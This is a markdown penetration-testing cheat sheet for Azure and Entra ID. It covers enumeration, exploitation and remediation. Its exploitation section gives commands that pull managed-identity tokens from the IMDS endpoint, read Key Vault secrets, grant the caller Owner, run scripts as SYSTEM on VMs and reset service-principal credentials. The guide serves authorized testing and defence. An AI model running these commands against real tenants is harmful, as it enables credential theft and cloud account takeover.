# Azure Pentest

> Azure AD (Entra ID) + ARM resource paths. Managed-identity abuse, storage SAS leakage, Key Vault access, Subscription privesc. Authorized engagements only.

## TL;DR
- Two control planes: **Microsoft Entra ID** (identity / tenant) and **ARM / Azure Resource Manager** (subscription resources). Roles in one don't necessarily grant the other (Global Admin ≠ Owner of every subscription unless explicitly elevated).
- Managed Identities (System / User-Assigned) on Azure VMs / App Service / Functions yield tokens via IMDS — SSRF chains compromise them the same way as AWS/GCP.
- Common cheap wins: world-readable Storage containers, SAS tokens checked into git, Key Vault `Reader`-or-above leakage, Function-app deployment credentials.
- Map: MicroBurst / ROADtools / Stormspotter coverage.

## Detection / Discovery

### Identity & subscriptions
| Command | Description |
| --- | --- |
| `az account show` | Current identity & subscription |
| `az account list --query '[].name'` | All accessible subscriptions |
| `az ad signed-in-user show` | Entra ID profile of current user |
| `az role assignment list --assignee <upn>` | RBAC bindings for an identity |
| `az ad user list --query "[].userPrincipalName"` | Tenant user enum (requires Entra read perms) |
| `az ad group list --query "[].displayName"` | Group enum |
| `az ad app list --query "[].displayName"` | App registrations |

### Resource surface
| Command | Description |
| --- | --- |
| `az resource list --query "[].{name:name,type:type,rg:resourceGroup}" -o table` | All resources you can list |
| `az vm list -o table` | VMs |
| `az storage account list -o table` | Storage accounts |
| `az keyvault list -o table` | Key Vaults |
| `az functionapp list -o table` | Function apps |
| `az aks list -o table` | AKS clusters |

### Recon toolchain
| Tool | Purpose |
| --- | --- |
| `ROADrecon` (https://github.com/dirkjanm/ROADtools) | Authenticated Entra ID dump — users, groups, devices, apps, role assignments |
| `MicroBurst` (https://github.com/NetSPI/MicroBurst) | Storage container brute force, password spray, dump-of-everything PowerShell modules |
| `Stormspotter` (now archived; ROADrecon supersedes) | Neo4j-backed Azure attack-graph |
| `Get-AzPasswords` (MicroBurst) | Pull Function App / WebApp / Key Vault / Container Registry creds your role can see |

## Exploitation

### Storage account misconfig
```bash
# Public containers — list
az storage container list --account-name <acct> --auth-mode login -o table

# Anonymous access if container ACL is Blob/Container
curl https://<acct>.blob.core.windows.net/<container>?restype=container&comp=list

# Container brute force (MicroBurst)
Invoke-EnumerateAzureBlobs -Base "company" -BingAPIKey "..."
```
SAS tokens (`?sv=…&sig=…`) found in source or logs grant scoped storage access without a tenant-level identity — search for them with gitleaks/trufflehog.

### Managed Identity SSRF
See [./ssrf-cloud-metadata.md](./ssrf-cloud-metadata.md). Short form:
```bash
# Azure IMDS endpoint (also requires Metadata header; "Metadata: true")
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Returns: {"access_token":"...","client_id":"...","resource":"https://management.azure.com/"}
```
The token's scope (`resource`) is set by the request; common targets:
- `https://management.azure.com/` — ARM (use with `az` after `az login --identity` or set as `AZURE_ACCESS_TOKEN`)
- `https://graph.microsoft.com/` — Entra ID / Graph
- `https://vault.azure.net/` — Key Vault secrets
- `https://storage.azure.com/` — Storage

### Key Vault secret extraction
```bash
az keyvault secret list --vault-name <vault>
az keyvault secret show --vault-name <vault> --name <secret> --query value -o tsv
```
RBAC: `Key Vault Secrets User` is enough for read. Access policies (older model) — check `az keyvault show --name <vault> --query properties.accessPolicies`.

### Subscription privilege escalation
- `Microsoft.Authorization/roleAssignments/write` → assign yourself Owner (`az role assignment create --role Owner --assignee <you> --scope /subscriptions/<sub>`).
- `Microsoft.Compute/virtualMachines/runCommand/action` → run arbitrary script as SYSTEM on any VM in scope (`az vm run-command invoke --command-id RunPowerShellScript --scripts "whoami"`).
- `Microsoft.Web/sites/publish/action` on a Function App with elevated Managed Identity → deploy code that exfils the MI token.
- `Microsoft.Storage/storageAccounts/listKeys/action` → mint a Shared Key with full storage account access.

### Entra ID — service principal abuse
- Application Admin / Cloud Application Admin can add credentials to any non-privileged SP (`az ad app credential reset --id <app>`) — pivot to that SP's API permissions.
- Privileged Authentication Admin can reset passwords for Global Admins (post-AzureAD GA elevation chain).

## Defence / Remediation
- **Storage**: disable anonymous blob access at the storage-account level (`allowBlobPublicAccess=false`). Use SAS tokens with narrow scope + short expiry + IP restriction; never put SAS into Git.
- **Managed Identities** instead of secrets — but treat the IMDS endpoint as a sensitive resource: defenders should block egress to `169.254.169.254` from any container that doesn't need it; web apps with user-input URL fetchers must enforce an allow-list and DNS-rebinding-safe fetcher.
- **Entra ID Conditional Access**: require MFA on every admin role; require compliant device for privileged sign-in; block legacy auth (POP/IMAP/SMTP/MAPI).
- **Privileged Identity Management (PIM)** — JIT activation for Global Admin / Owner / Contributor; require approval + MFA.
- **RBAC tightening**: avoid `Owner` and `Contributor` on broad scopes; use built-in roles (e.g., `Storage Blob Data Reader`) or custom roles. Audit with Azure AD Access Reviews and Microsoft Defender for Cloud's recommendations.
- **Logging**: Activity Log + Microsoft Sentinel; alert on `Microsoft.Authorization/roleAssignments/write` outside change windows, `Microsoft.KeyVault/vaults/secrets/read` from new principals, and `runCommand` invocation on production VMs.

## Sources
- Azure Security Documentation: https://learn.microsoft.com/en-us/azure/security/
- Microsoft Entra ID security: https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/security-emergency-access
- Azure IMDS: https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service
- ROADtools: https://github.com/dirkjanm/ROADtools
- MicroBurst: https://github.com/NetSPI/MicroBurst
- HackTricks Azure pentesting: https://book.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html
- Andy Robbins / SpecterOps Entra ID research: https://posts.specterops.io/tagged/azure
- MITRE ATT&CK for Cloud — Azure AD: https://attack.mitre.org/matrices/enterprise/cloud/azuread/
